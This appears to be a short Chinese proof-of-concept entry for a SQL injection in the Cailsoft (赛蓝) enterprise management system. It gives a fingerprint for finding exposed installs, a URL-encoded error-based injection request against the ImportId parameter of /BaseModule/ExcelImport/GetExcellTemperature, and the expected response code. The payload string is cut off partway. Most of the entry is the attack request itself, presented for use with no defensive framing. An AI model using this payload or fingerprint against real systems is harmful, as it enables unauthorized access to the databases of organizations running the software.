# 赛蓝企业管理系统GetExcellTemperatureSQL注入漏洞

赛蓝企业管理系统GetExcellTemperature ｜ SQL注入 ｜ —
- **指纹**：`body="www.cailsoft.com"`
- **请求**：`GET /BaseModule/ExcelImport/GetExcellTemperature?ImportId=%27%20AND%206935%20IN%20(SELECT%20(CHAR(113)%2BCHAR(122)%2BCHAR(112)%2BCHAR(106)%2BCHAR(113)%2B(SELECT%20(CASE%20WHEN%20(6935%3D6935)%20THEN%2`
- **响应特征**：200